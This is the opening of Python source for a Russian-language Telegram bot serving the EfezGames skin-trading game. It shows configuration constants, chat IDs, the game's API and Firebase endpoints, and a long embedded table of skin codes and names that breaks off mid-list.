
async def back_handler(update, context):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id
    try:
        if is_admin(user_id):
            await show_admin_menu(query)
        else:
            await show_user_menu(query)
    except Exception as e:
        await query.edit_message_text("Ошибка возврата в меню")

#!/usr/bin/env python3
import asyncio
import json
import os
import re
import time
import threading
import random
import string
import uuid
import logging
import urllib.parse
from datetime import datetime, timedelta, timezone
from typing import Dict, Set, Optional, Tuple, Any, List

import requests
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackQueryHandler
from telegram.error import RetryAfter

# ================= НАСТРОЙКИ ЛОГИРОВАНИЯ =================
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bot.log", encoding='utf-8'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)
# =========================================================

# ================= НАСТРОЙКИ =================
BOT_TOKEN = os.getenv("BOT_TOKEN", "")
DEFAULT_SENDER_ID = "EfezAdmin1"
OWNER_ID = 5150403377
FIREBASE_URL = "https://api-project-7952672729.firebaseio.com"
API_BASE_URL = "https://api.efezgames.com/v1"
REFERRAL_BONUS = 1500

# Файлы данных
PLAYER_DATA_DIR = "player"
LEGACY_PLAYERS_FILE = "data/players.json"
PLAYERS_FILE = os.path.join(PLAYER_DATA_DIR, "players.json")
INVENTORY_FILE = os.path.join(PLAYER_DATA_DIR, "inventory.json")
EXCHANGES_FILE = os.path.join(PLAYER_DATA_DIR, "exchanges.json")
WHITETRADE_FILE = os.path.join(PLAYER_DATA_DIR, "whitetrade.json")
PROMOCODES_FILE = os.path.join(PLAYER_DATA_DIR, "promocodes.json")
BROADCASTS_FILE = "data/broadcasts.json"
CONFIG_FILE = "monitor_config.json"
LOG_DIR = "logs"
DOWNLOAD_LIMIT = 100
SENDER_PROFILE_FILE = "data/sender_profile.json"

# Чаты для уведомлений
TRADE_VIRTUAL_CHAT = -1003534308756
TRADE_VIRTUAL_THREAD = 6159
TRADE_WITHDRAW_CHAT = -1003534308756
TRADE_WITHDRAW_THREAD = 10579
PROMO_CHANNEL = "@EfezGame"

TRADE_NOTIFY_CHAT = -1003534308756
TRADE_NOTIFY_THREAD = 5795

# Чат для логов ошибок вывода
ERROR_LOG_CHAT = -1003534308756
ERROR_LOG_THREAD = 11673

DEFAULT_LINKS = {
    "RU": "https://t.me/c/3534308756/3",
    "UA": "https://t.me/c/3534308756/7",
    "US": "https://t.me/c/3534308756/5",
    "PL": "https://t.me/c/3534308756/9",
    "DE": "https://t.me/c/3534308756/6",
    "PREMIUM": "https://t.me/c/3534308756/4",
    "DEV": "https://t.me/c/3534308756/443"
}

MONITOR_CONFIG = {
    "UPDATE_INTERVAL": 2,
    "MAX_MESSAGES": 20,
    "API_BASE_URL": API_BASE_URL,
    "FIREBASE_URL": FIREBASE_URL,
    "REQUEST_TIMEOUT": 10,
    "RETRY_ATTEMPTS": 3,
    "RETRY_DELAY": 2
}
# ==============================================

# ===== ВСТРОЕННЫЕ ТЕКСТОВЫЕ ДАННЫЕ =====
EMBEDDED_SKINS_TEXT = "Bayonet:\nVH | Bayonet Knife| Doppler (Black Pearl)\nVI | Bayonet Knife| Doppler (Phase 1)\nVJ | Bayonet Knife| Doppler (Phase 2)\nVK | Bayonet Knife| Doppler (Phase 3)\nVL | Bayonet Knife| Doppler (Phase 4)\nVM | Bayonet Knife| Doppler (Ruby)\nVN | Bayonet Knife| Doppler (Sapphire)\nVc | Bayonet Knife | Gamma Doppler (Emerald)\nVd | Bayonet Knife | Gamma Doppler (Phase 1)\nVe | Bayonet Knife | Gamma Doppler (Phase 2)\nVf | Bayonet Knife | Gamma Doppler (Phase 3)\nVg | Bayonet Knife | Gamma Doppler (Phase 4)\nHw | Bayonet Knife Autotronic \nHu | Bayonet Knife Black Laminate \nH5 | Bayonet Knife Blue Steel \nH6 | Bayonet Knife Boreal Forest\nHx | Bayonet Knife Bright Water\nH7 | Bayonet Knife Case Hardened\nH8 | Bayonet Knife Crimson Web\nHz | Bayonet Knife Damascus Steel \nH0 | Bayonet Knife Doppler \nH9 | Bayonet Knife Fade\nIA | Bayonet Knife Forest DDRAT\nHy | Bayonet Knife Freehand\nHv | Bayonet Knife Gamma Doppler\nHt | Bayonet Knife Lore\nH1 | Bayonet Knife Marble Fade \nIB | Bayonet Knife Night\nH3 | Bayonet Knife Rust Coat\nIC | Bayonet Knife Safari Mesh \nID | Bayonet Knife Scorched\nIE | Bayonet Knife Slaughter\nIF | Bayonet Knife Stained\nH2 | Bayonet Knife Tiger Tooth \nH4 | Bayonet Knife Ultraviolet \nIG | Bayonet Knife Urban Masked\n===================\nM9 Bayonet:\nW1 | M9 Bayonet Knife | Case Hardened (Blue Gem)\nVx | M9 Bayonet Knife | Gamma Doppler (Phase 1)\nVy | M9 Bayonet Knife | Gamma Doppler (Phase 2)\nVz | M9 Bayonet Knife | Gamma Doppler (Phase 3)\nV0 | M9 Bayonet Knife | Gamma Doppler (Phase 4)\nJU | M9 Bayonet Knife Autotronic\nJS | M9 Bayonet Knife Black Laminate\nJd | M9 Bayonet Knife Blue Steel\nJe | M9 Bayonet Knife Boreal Forest\nJV | M9 Bayonet Knife Bright Water\nJf | M9 Bayonet Knife Case Hardened\nJg | M9 Bayonet Knife Crimson Web\nJX | M9 Bayonet Knife Damascus Steel\nJY | M9 Bayonet Knife Doppler\nJh | M9 Bayonet Knife Fade\nJi | M9 Bayonet Knife Forest DDPAT\nJW | M9 Bayonet Knife Freehand\nJT | M9 Bayonet Knife Gamma Doppler\nJR | M9 Bayonet Knife Lore\nJZ | M9 Bayonet Knife Marble Fade\nJj | M9 Bayonet Knife Night\nJb | M9 Bayonet Knife Rust Coat\nJk | M9 Bayonet Knife Safari Mesh\nJl | M9 Bayonet Knife Scorched\nJm | M9 Bayonet Knife Slaughter\nJn | M9 Bayonet Knife Stained\nJa | M9 Bayonet Knife Tiger Tooth\nJc | M9 Bayonet Knife Ultraviolet\nJo | M9 Bayonet Knife Urban Masked\nVO | M9 Bayonet Knife| Doppler (Black Pearl)\nVP | M9 Bayonet Knife| Doppler (Phase 1)\nVQ | M9 Bayonet Knife| Doppler (Phase 2)\nVR | M9 Bayonet Knife| Doppler (Phase 3)\nVS | M9 Bayonet Knife| Doppler (Phase 4)\nVT | M9 Bayonet Knife| Doppler (Ruby)\nVU | M9 Bayonet Knife| Doppler (Sapphire)\nVw | M9 Bayonet Knife| Gamma Doppler (Emerald)\n===================\nBowie:\nLA | Bowie Knife Night\nZO | Bowie Knife | Autotronic\nZQ | Bowie Knife | Black Laminate\nZP | Bowie Knife | Bright Water\nV1 | Bowie Knife | Doppler (Black Pearl)\nV2 | Bowie Knife | Doppler (Phase 1)\nV3 | Bowie Knife | Doppler (Phase 2)\nV4 | Bowie Knife | Doppler (Phase 3)\nV5 | Bowie Knife | Doppler (Phase 4)\nV6 | Bowie Knife | Doppler (Ruby)\nV7 | Bowie Knife | Doppler (Sapphire)\nZN | Bowie Knife | Freehand\nZL | Bowie Knife | Gamma Doppler\nZM | Bowie Knife | Lore\nLC | Bowie Knife Blue Steel\nK9 | Bowie Knife Boreal Forest\nK7 | Bowie Knife Case Hardened\nK8 | Bowie Knife Crimson Web\nK1 | Bowie Knife Damascus Steel\nK2 | Bowie Knife Doppler\nK6 | Bowie Knife Fade\nLE | Bowie Knife Forest DDPAT\nK3 | Bowie Knife Marble Fade\nK0 | Bowie Knife Rust Coat\nLG | Bowie Knife Safari Mesh\nLD | Bowie Knife Scorched\nK5 | Bowie Knife Slaughter\nLB | Bowie Knife Stained\nK4 | Bowie Knife Tiger Tooth\nKz | Bowie Knife Ultraviolet\nLF | Bowie Knife Urban Masked\n===================\nKukri:\nce | Kukri Knife Stained\ncY | Kukri Knife | Fade\nci | Kukri Knife | Urban Masked\nca | Kukri Knife | Slaughter\ncd | Kukri Knife | Night Stripe\ncf | Kukri Knife | Forest DDPAT\ncg | Kukri Knife | Scorched\nch | Kukri Knife | Boreal Forest\ncj | Kukri Knife | Safari Mesh\ncZ | Kukri Knife | Crimson Web\ncc | Kukri Knife | Blue Steel\ncb | Kukri Knife | Case Hardened\n===================\nButterfly:\nZS | Butterfly Knife | Autotronic\nZU | Butterfly Knife | Black Laminate\nZT | Butterfly Knife | Bright Water\nWq | Butterfly Knife | Case Hardened (Blue Gem)\nWr | Butterfly Knife | Case Hardened (Gold Gem)\nV8 | Butterfly Knife | Doppler (Black Pearl)\nV9 | Butterfly Knife | Doppler (Phase 1)\nWA | Butterfly Knife | Doppler (Phase 2)\nWB | Butterfly Knife | Doppler (Phase 3)\nWC | Butterfly Knife | Doppler (Phase 4)\nWD | Butterfly Knife | Doppler (Ruby)\nWE | Butterfly Knife | Doppler (Sapphire)\nZV | Butterfly Knife | Freehand\nZW | Butterfly Knife | Gamma Doppler\nZR | Butterfly Knife | Lore\nKH | Butterfly Knife Blue Steel\nKL | Butterfly Knife Boreal Forest\nKG | Butterfly Knife Case Hardened\nKF | Butterfly Knife Crimson Web\nJ7 | Butterfly Knife Damascus Steel\nJ8 | Butterfly Knife Doppler\nKD | Butterfly Knife Fade\nKO | Butterfly Knife Forest DDPAT\nKB | Butterfly Knife Marble Fade\nKI | Butterfly Knife Night\nKA | Butterfly Knife Rust Coat\nKK | Butterfly Knife Safari Mesh\nKN | Butterfly Knife Scorched\nKE | Butterfly Knife Slaughter\nKJ | Butterfly Knife Stained\nKC | Butterfly Knife Tiger Tooth\nJ9 | Butterfly Knife Ultraviolet\nKM | Butterfly Knife Urban Masked\n===================\nClassic:\nWx | Classic Knife | Case Hardened (Gold Gem)\nPJ | Classic Knife Blue Steel\nPK | Classic Knife Boreal Forest\nPH | Classic Knife Case Hardened\nPG | Classic Knife Crimson Web\nPE | Classic Knife Fade\nPI | Classic Knife Forest DDPAT\nPL | Classic Knife Night Stripe\nPM | Classic Knife Safari Mesh\nPO | Classic Knife Scorched\nPF | Classic Knife Slaughter\nPN | Classic Knife Stained\nPP | Classic Knife Urban Masked\n===================\nFalchion:\nZX | Falchion Knife | Autotronic\nZb | Falchion Knife | Black Laminate\nZc | Falchion Knife | Bright Water\nWs | Falchion Knife | Case Hardened (Blue Gem)\nWt | Falchion Knife | Case Hardened (Gold Gem)\nWF | Falchion Knife | Doppler (Black Pearl)\nWG | Falchion Knife | Doppler (Phase 1)\nWH | Falchion Knife | Doppler (Phase 2)\nWI | Falchion Knife | Doppler (Phase 3)\nWJ | Falchion Knife | Doppler (Phase 4)\nWK | Falchion Knife | Doppler (Ruby)\nWL | Falchion Knife | Doppler (Sapphire)\nZZ | Falchion Knife | Freehand\nZY | Falchion Knife | Gamma Doppler\nZa | Falchion Knife | Lore\nKa | Falchion Knife Blue Steel\nKd | Falchion Knife Boreal Forest\nKZ | Falchion Knife Case Hardened\nKX | Falchion Knife Crimson Web\nKQ | Falchion Knife Damascus Steel\nKT | Falchion Knife Doppler\nKV | Falchion Knife Fade\nKf | Falchion Knife Forest DDPAT\nKU | Falchion Knife Marble Fade\nKY | Falchion Knife Night\nKR | Falchion Knife Rust Coat\nKg | Falchion Knife Safari Mesh\nKe | Falchion Knife Scorched\nKW | Falchion Knife Slaughter\nKb | Falchion Knife Stained\nKP | Falchion Knife Tiger Tooth\nKS | Falchion Knife Ultraviolet\nKc | Falchion Knife Urban Masked\n===================\nFlip:\nWj | Flip Knife | Case Hardened (Blue Gem)\nWk | Flip Knife | Case Hardened (Gold Gem)\nVA | Flip Knife | Doppler (Black Pearl)\nVB | Flip Knife | Doppler (Phase 1)\nVC | Flip Knife | Doppler (Phase 2)\nVD | Flip Knife | Doppler (Phase 3)\nVE | Flip Knife | Doppler (Phase 4)\nVF | Flip Knife | Doppler (Ruby)\nVG | Flip Knife | Doppler (Sapphire)\nVh | Flip Knife | Gamma Doppler (Emerald)\nVi | Flip Knife | Gamma Doppler (Phase 1)\nVj | Flip Knife | Gamma Doppler (Phase 2)\nVk | Flip Knife | Gamma Doppler (Phase 3)\nVl | Flip Knife | Gamma Doppler (Phase 4)\nIK | Flip Knife Autotronic\nII | Flip Knife Black Laminate\nIT | Flip Knife Blue Steel\nIY | Flip Knife Forest DDPAT\nIU | Flip Knife Boreal Forest\nIL | Flip Knife Bright Water\nIX | Flip Knife Case Hardened\nIM | Flip Knife Damascus Steel\nIP | Flip Knife Doppler\nIV | Flip Knife Fade\nIW | Flip Knife Crimson Web\nIN | Flip Knife Freehand\nIJ | Flip Knife Gamma Doppler\nIH | Flip Knife Lore\nIO | Flip Knife Marble Fade\nIZ | Flip Knife Night\nIR | Flip Knife Rust Coat\nIa | Flip Knife Safari Mesh\nIb | Flip Knife Scorched\nIc | Flip Knife Slaughter\nId | Flip Knife Stained\nIQ | Flip Knife Tiger Tooth\nIS | Flip Knife Ultraviolet\nIe | Flip Knife Urban Masked\n===================\nGut:\nU3 | Gut Knife | Doppler (Black Pearl)\nU4 | Gut Knife | Doppler (Phase 1)\nU5 | Gut Knife | Doppler (Phase 2)\nU6 | Gut Knife | Doppler (Phase 3)\nU7 | Gut Knife | Doppler (Phase 4)\nU8 | Gut Knife | Doppler (Ruby)\nU9 | Gut Knife | Doppler (Sapphire)\nVm | Gut Knife | Gamma Doppler (Emerald)\nVn | Gut Knife | Gamma Doppler (Phase 1)\nVo | Gut Knife | Gamma Doppler (Phase 2)\nVp | Gut Knife | Gamma Doppler (Phase 3)\nVq | Gut Knife | Gamma Doppler (Phase 4)\nIi | Gut Knife Autotronic\nIg | Gut Knife Black Laminate\nIr | Gut Knife Blue Steel\nIs | Gut Knife Boreal Forest\nIj | Gut Knife Bright Water\nIt | Gut Knife Case Hardened\nIu | Gut Knife Crimson Web\nIl | Gut Knife Damascus Steel\nIm | Gut Knife Doppler\nIv | Gut Knife Fade\nIw | Gut Knife Forest DDPAT\nIk | Gut Knife Freehand\nIh | Gut Knife Gamma Doppler\nIf | Gut Knife Lore\nIn | Gut Knife Marble Fade\nIx | Gut Knife Night\nIp | Gut Knife Rust Coat\nIy | Gut Knife Safari Mesh\nIz | Gut Knife Scorched\nI0 | Gut Knife Slaughter\nI1 | Gut Knife Stained\nIo | Gut Knife Tiger Tooth\nIq | Gut Knife Ultraviolet\nI2 | Gut Knife Urban Masked\n===================\nHuntsman:\nZf | Huntsman Knife | Autotronic\nZh | Huntsman Knife | Black Laminate\nZg | Huntsman Knife | Bright Water\nWo | Huntsman Knife | Case Hardened (BlueGem)\nWp | Huntsman Knife | Case Hardened (Gold Gem)\nWM | Huntsman Knife | Doppler (Black Pearl)\nWN | Huntsman Knife | Doppler (Phase 1)\nWO | Huntsman Knife | Doppler (Phase 2)\nWP | Huntsman Knife | Doppler (Phase 3)\nWQ | Huntsman Knife | Doppler (Phase 4)\nWS | Huntsman Knife | Doppler (Sapphire)\nWR | Huntsman Knife | Doppler (Sapphire)]\nZi | Huntsman Knife | Freehand\nZd | Huntsman Knife | Gamma Doppler\nZe | Huntsman Knife | Lore\nJ1 | Huntsman Knife Blue Steel\nJ4 | Huntsman Knife Boreal Forest\nJy | Huntsman Knife Case Hardened\nJx | Huntsman Knife Crimson Web\nJp | Huntsman Knife Damascus Steel\nJt | Huntsman Knife Doppler\nJv | Huntsman Knife Fade\nJ5 | Huntsman Knife Forest DDPAT\nJu | Huntsman Knife Marble Fade\nJz | Huntsman Knife Night\nJs | Huntsman Knife Rust Coat\nJ3 | Huntsman Knife Safari Mesh\nJ2 | Huntsman Knife Scorched\nJw | Huntsman Knife Slaughter\nJ0 | Huntsman Knife Stained\nJr | Huntsman Knife Tiger Tooth\nJq | Huntsman Knife Ultraviolet\nJ6 | Huntsman Knife Urban Masked\n===================\nKarambit:\nWm | Karambit Knife | Case Hardened (Blue Gem)\nWn | Karambit Knife | Case Hardened (Gold Gem)\nVV | Karambit Knife | Doppler (Black Pearl)\nVW | Karambit Knife | Doppler (Phase 1)\nVX | Karambit Knife | Doppler (Phase 2)\nVY | Karambit Knife | Doppler (Phase 3)\nVZ | Karambit Knife | Doppler (Phase 4)\nVa | Karambit Knife | Doppler (Ruby)\nVb | Karambit Knife | Doppler (Sapphire)\nI6 | Karambit Knife Autotronic\nI4 | Karambit Knife Black Laminate\nJF | Karambit Knife Blue Steel\nJG | Karambit Knife Boreal Forest\nI7 | Karambit Knife Bright Water\nJH | Karambit Knife Case Hardened\nJI | Karambit Knife Crimson Web\nI9 | Karambit Knife Damascus Steel\nJA | Karambit Knife Doppler\nJJ | Karambit Knife Fade\nJK | Karambit Knife Forest DDPAT\nI8 | Karambit Knife Freehand\nI5 | Karambit Knife Gamma Doppler\nI3 | Karambit Knife Lore\nJB | Karambit Knife Marble Fade\nJL | Karambit Knife Night\nJD | Karambit Knife Rust Coat\nJM | Karambit Knife Safari Mesh\nJN | Karambit Knife Scorched\nJO | Karambit Knife Slaughter\nJP | Karambit Knife Stained\nJC | Karambit Knife Tiger Tooth\nJE | Karambit Knife Ultraviolet\nJQ | Karambit Knife Urban Masked\nVr | Karambit Knife| Gamma Doppler (Emerald)\nVs | Karambit Knife| Gamma Doppler (Phase 1)\nVt | Karambit Knife| Gamma Doppler (Phase 2)\nVu | Karambit Knife| Gamma Doppler (Phase 3)\nVv | Karambit Knife| Gamma Doppler (Phase 4)\n===================\nNavaja:\nUb | Navaja Knife | Doppler (Black Pearl)\nUf | Navaja Knife | Doppler (Phase 1)\nUe | Navaja Knife | Doppler (Phase 2)\nUd | Navaja Knife | Doppler (Phase 3)\nUc | Navaja Knife | Doppler (Phase 4)\nUg | Navaja Knife | Doppler (Ruby)\nUh | Navaja Knife | Doppler (Sapphire)\nOQ | Navaja Knife Blue Steel\nOS | Navaja Knife Boreal Forest\nOP | Navaja Knife Case Hardened\nOO | Navaja Knife Crimson Web\nOH | Navaja Knife Damascus Steel\nOI | Navaja Knife Doppler\nOL | Navaja Knife Fade\nOW | Navaja Knife Forest DDPAT\nOG | Navaja Knife Marble Fade\nOU | Navaja Knife Night Stripe\nOK | Navaja Knife Rust Coat\nOV | Navaja Knife Safari Mesh\nOT | Navaja Knife Scorched\nOM | Navaja Knife Slaughter\nOR | Navaja Knife Stained\nOF | Navaja Knife Tiger Tooth\nOJ | Navaja Knife Ultraviolet\nON | Navaja Knife Urban Masked\n===================\nNomad:\nQP | Nomad Knife Blue Steel\nQN | Nomad Knife Boreal Forest\nQO | Nomad Knife Case Hardened\nQL | Nomad Knife Crimson Web\nQJ | Nomad Knife Fade\nQR | Nomad Knife Forest DDPAT\nQT | Nomad Knife Night Stripe\nQU | Nomad Knife Safari Mesh\nQQ | Nomad Knife Scorched\nQK | Nomad Knife Slaughter\nQS | Nomad Knife Stained\nQM | Nomad Knife Urban Masked\n===================\nParacord:\nPp | Paracord Knife Blue Steel\nPq | Paracord Knife Boreal Forest\nPn | Paracord Knife Case Hardened\nPm | Paracord Knife Crimson Web\nPk | Paracord Knife Fade\nPu | Paracord Knife Forest DDPAT\nPl | Paracord Knife Night Stripe\nPs | Paracord Knife Safari Mesh\nPt | Paracord Knife Scorched\nPj | Paracord Knife Slaughter\nPo | Paracord Knife Stained\nPr | Paracord Knife Urban Masked\n===================\nShadow Daggers:\nZk | Shadow Daggers Knife | Autotronic\nZl | Shadow Daggers Knife | Black Laminate\nZn | Shadow Daggers Knife | Bright Water\nWu | Shadow Daggers Knife | Case Hardened (Blue Gem)\nWT | Shadow Daggers Knife | Doppler (Black Pearl)\nWU | Shadow Daggers Knife | Doppler (Phase 1)\nWV | Shadow Daggers Knife | Doppler (Phase 2)\nWW | Shadow Daggers Knife | Doppler (Phase 3)\nWX | Shadow Daggers Knife | Doppler (Phase 4)\nWY | Shadow Daggers Knife | Doppler (Ruby)\nWZ | Shadow Daggers Knife | Doppler (Sapphire)\nZj | Shadow Daggers Knife | Freehand\nZm | Shadow Daggers Knife | Gamma Doppler\nKs | Shadow Daggers Knife Blue Steel\nKx | Shadow Daggers Knife Boreal Forest\nKq | Shadow Daggers Knife Case Hardened\nKo | Shadow Daggers Knife Crimson Web\nKj | Shadow Daggers Knife Damascus Steel\nKi | Shadow Daggers Knife Doppler\nKn | Shadow Daggers Knife Fade\nKw | Shadow Daggers Knife Forest DDPAT\nZo | Shadow Daggers Knife Lore\nKh | Shadow Daggers Knife Marble Fade\nKr | Shadow Daggers Knife Night\nKk | Shadow Daggers Knife Rust Coat\nKy | Shadow Daggers Knife Safari Mesh\nKu | Shadow Daggers Knife Scorched\nKp | Shadow Daggers Knife Slaughter\nKv | Shadow Daggers Knife Stained\nKm | Shadow Daggers Knife Tiger Tooth\nKl | Shadow Daggers Knife Ultraviolet\nKt | Shadow Daggers Knife Urban Masked\n===================\nSkeleton:\nWy | Skeleton Knife | Case Hardened (Blue Gem)\nWz | Skeleton Knife | Case Hardened (Gold Gem)\nQB | Skeleton Knife Blue Steel\nQF | Skeleton Knife Boreal Forest\nP9 | Skeleton Knife Case Hardened\nP8 | Skeleton Knife Crimson Web\nP7 | Skeleton Knife Fade\nQE | Skeleton Knife Forest DDPAT\nQD | Skeleton Knife Night Stripe\nQG | Skeleton Knife Safari Mesh\nQI | Skeleton Knife Scorched\nQA | Skeleton Knife Slaughter\nQC | Skeleton Knife Stained\nQH | Skeleton Knife Urban Masked\n===================\nStiletto:\nUi | Stiletto Knife | Doppler (Black Pearl)\nUj | Stiletto Knife | Doppler (Phase 1)\nUk | Stiletto Knife | Doppler (Phase 2)\nUl | Stiletto Knife | Doppler (Phase 3)\nUm | Stiletto Knife | Doppler (Phase 4)\nUn | Stiletto Knife | Doppler (Ruby)\nUo | Stiletto Knife | Doppler (Sapphire)\nNA  | Stiletto Knife Blue Steel\nNF | Stiletto Knife Boreal Forest\nNI | Stiletto Knife Case Hardened\nM9 | Stiletto Knife Crimson Web\nOZ | Stiletto Knife Damascus Steel\nOX | Stiletto Knife Doppler\nM7 | Stiletto Knife Fade\nNB | Stiletto Knife Forest DDPAT\nOY | Stiletto Knife Marble Fade\nND | Stiletto Knife Night Stripe\nOc | Stiletto Knife Rust Coat\nNG | Stiletto Knife Safari Mesh\nNE | Stiletto Knife Scorched\nM8 | Stiletto Knife Slaughter\nNC | Stiletto Knife Stained\nOb | Stiletto Knife Tiger Tooth\nOa | Stiletto Knife Ultraviolet\nNH | Stiletto Knife Urban Masked\n===================\nSurvival:\nP3 | Survival Knife Blue Steel\nPz | Survival Knife Boreal Forest\nPx | Survival Knife Case Hardened\nPy | Survival Knife Crimson Web\nPv | Survival Knife Fade\nP4 | Survival Knife Forest DDPAT\nP2 | Survival Knife Night Stripe\nP5 | Survival Knife Safari Mesh\nP1 | Survival Knife Scorched\nPw | Survival Knife Slaughter\nP0 | Survival Knife Stained\nP6 | Survival Knife Urban Masked\n===================\nTalon:\nWv | Talon Knife | Case Hardened (Blue Gem)\nWw | Talon Knife | Case Hardened (Gold Gem)\nUp | Talon Knife | Doppler (Black Pearl)\nUq | Talon Knife | Doppler (Phase 1)\nUr | Talon Knife | Doppler (Phase 2)\nUs | Talon Knife | Doppler (Phase 3)\nUt | Talon Knife | Doppler (Phase 4)\nUu | Talon Knife | Doppler (Ruby)\nUv | Talon Knife | Doppler (Sapphire)\nNK | Talon Knife Blue Steel\nNU | Talon Knife Boreal Forest\nNN | Talon Knife Case Hardened\nNL | Talon Knife Crimson Web\nOg | Talon Knife Damascus Steel\nOe | Talon Knife Doppler\nNM | Talon Knife Fade\nNO | Talon Knife Forest DDPAT\nOd | Talon Knife Marble Fade\nNT | Talon Knife Night Stripe\nOh | Talon Knife Rust Coat\nNP | Talon Knife Safari Mesh\nNQ | Talon Knife Scorched\nNJ | Talon Knife Slaughter\nNS | Talon Knife Stained\nOf | Talon Knife Tiger Tooth\nOi | Talon Knife Ultraviolet\nNR | Talon Knife Urban Masked\n===================\nUrsus:\nUw | Ursus Knife | Doppler (Black Pearl)\nUx | Ursus Knife | Doppler (Phase 1)\nUy | Ursus Knife | Doppler (Phase 2)\nUz | Ursus Knife | Doppler (Phase 3)\nU0 | Ursus Knife | Doppler (Phase 4)\nU1 | Ursus Knife | Doppler (Ruby)\nU2 | Ursus Knife | Doppler (Sapphire)\nNW | Ursus Knife Blue Steel\nNd | Ursus Knife Boreal Forest\nNX | Ursus Knife Case Hardened\nNf | Ursus Knife Crimson Web\nOn | Ursus Knife Damascus Steel\nOl | Ursus Knife Doppler\nNg | Ursus Knife Fade\nNZ | Ursus Knife Forest DDPAT\nOk | Ursus Knife Marble Fade\nNb | Ursus Knife Night Stripe\nOo | Ursus Knife Rust Coat\nNY | Ursus Knife Safari Mesh\nNe | Ursus Knife Scorched\nNV | Ursus Knife Slaughter\nNc | Ursus Knife Stained\nOj | Ursus Knife Tiger Tooth\nOm | Ursus Knife Ultraviolet\nNa | Ursus Knife Urban Masked\n===================\nGloves:\nLH | Bloodhound Gloves Bronzed \nLI | Bloodhound Gloves Charred\nLJ | Bloodhound Gloves Guerrila\nLK | Bloodhound Gloves Snakebite\nT3 | Broken Fang Gloves | Jade\nT6 | Broken Fang Gloves | Needle Point\nT4 | Broken Fang Gloves | Unhinged\nT5 | Broken Fang Gloves | Yellow-banded\nT9 | Driver Gloves | Black Tie\nUA | Driver Gloves | Queen Jaguar\nT8 | Driver Gloves | Rezan the Red\nT7 | Driver Gloves | Snow Leopard\nLL | Driver Gloves Convoy\nLM | Driver Gloves Crimson Weave\nLN | Driver Gloves Diamondback\nMZ | Driver Gloves Imperial Plaid\nMY | Driver Gloves King Snake\nLO | Driver Gloves Lunar Weave\nMa | Driver Gloves Overtake\nMb | Driver Gloves Racing Green\nMT | Hand Wraps Gloves Arboreal\nLP | Hand Wraps Gloves Badlands\nMQ | Hand Wraps Gloves Cobalt Skulls\nMS | Hand Wraps Gloves Duct Tape\nLQ | Hand Wraps Gloves Leather\nMR | Hand Wraps Gloves Overprint\nLR | Hand Wraps Gloves Slaughter\nLS | Hand Wraps Gloves Spruce DDPAT\nUB | Hand Wraps Gloves| CAUTION!\nUD | Hand Wraps Gloves| Constrictor\nUE | Hand Wraps Gloves| Desert Shamagh\nUC | Hand Wraps Gloves| Giraffe\nME | Hydra Gloves Case Hardened\nMF | Hydra Gloves Emerald\nMH | Hydra Gloves Mangrove\nMG | Hydra Gloves Rattler\nUI | Moto Gloves | 3rd Commando Company\nUG | Moto Gloves | Blood Pressure\nUF | Moto Gloves | Finish Line\nUH | Moto Gloves | Smoke Out\nLT | Moto Gloves Boom!\nLU | Moto Gloves Cool Mint\nLV | Moto Gloves Eclipse\nMX | Moto Gloves Polygon\nMU | Moto Gloves POW!\nLW | Moto Gloves Spearmint\nMW | Moto Gloves Transport\nMV | Moto Gloves Turtle\nUM | Specialist Gloves | Field agent\nUJ | Specialist Gloves | Lt. Commander\nUK | Specialist Gloves | Marble Fade\nUL | Specialist Gloves | Tiger Strike\nML | Specialist Gloves Buckshot\nLX | Specialist Gloves Crimson Kimono\nMJ | Specialist Gloves Crimson Web\nLY | Specialist Gloves Emerald Web\nMI | Specialist Gloves Fade\nLZ | Specialist Gloves Forest DDPAT\nLa | Specialist Gloves Foundation\nMK | Specialist Gloves Mogul\nUO | Sport Gloves | Big Game\nUQ | Sport Gloves | Nocts\nUP | Sport Gloves | Scarlet Shamagh\nUN | Sport Gloves | Slingshot\nMO | Sport Gloves Amphibious\nLb | Sport Gloves Arid\nMP | Sport Gloves Bronze Morph\nLc | Sport Gloves Hedge Maze\nMM | Sport Gloves Omega\nLd | Sport Gloves Pandora's Box\nLe | Sport Gloves Superconductor\nMN | Sport Gloves Vice\n===================\nAgent:\nYZ | Distinguished Agent | 3rd Commando Company | KSK\naF | Distinguished Agent | Aspirant | Gendarmerie Nationale\nYd | Distinguished Agent | B Squadron Officer | SAS\nYb | Distinguished Agent | Bio-Haz Specialist | SWAT\nYY | Distinguished Agent | Chem-Haz Specialist | SWAT\naC | Distinguished Agent | D Squadron Officer | NZSAS\nYf | Distinguished Agent | Dragomir | Sabre Footsoldier\nYg | Distinguished Agent | Enforcer | Phoenix\nYi | Distinguished Agent | Ground Rebel | Elite Crew\naE | Distinguished Agent | Mr. Muhlik | Elite Crew\nYe | Distinguished Agent | Operator | FBI SWAT\naB | Distinguished Agent | Primeiro Tenente | Brazilian 1st Battalion\nYa | Distinguished Agent | Seal Team 6 Soldier | NSWC SEAL\nYh | Distinguished Agent | Soldier | Phoenix\nYc | Distinguished Agent | Street Soldier | Phoenix\naD | Distinguished Agent | Trapper Aggressor | Guerrilla Warfare\nYR | Exceptional Agent | 'Blueberries' Buckshot | NSWC SEAL\nYS | Exceptional Agent | Buckshot | NSWC SEAL\nZ6 | Exceptional Agent | Col. Mangos Dabisi | Guerrilla Warfare\nYW | Exceptional Agent | Dragomir | Sabre\nYN | Exceptional Agent | Getaway Sally | The Professionals\nYQ | Exceptional Agent | John 'Van Healen' Kask | SWAT\nZ9 | Exceptional Agent | Lieutenant 'Tree Hugger' Farlow | SWAT\nYO | Exceptional Agent | Little Kev | The Professionals\nYT | Exceptional Agent | Markus Delrow | FBI HRT\nYV | Exceptional Agent | Maximus | Sabre\nZ7 | Exceptional Agent | Officer Jacques Beltram | Gendarmerie Nationale\nYX | Exceptional Agent | Osiris | Elite Crew\nYP | Exceptional Agent | Sergeant Bombson | SWAT\nYU | Exceptional Agent | Slingshot | Phoenix\naA | Exceptional Agent | Sous-Lieutenant Medic | Gendarmerie Nationale\nZ8 | Exceptional Agent | Trapper | Guerrilla Warfare\nZx | Master Agent | 'Medium Rare' Crasswater | Guerrilla Warfare\nYB | Master Agent | 'The Doctor' Romanov | Sabre\nZv | Master Agent | Chef d'Escadron Rouchard | Gendarmerie 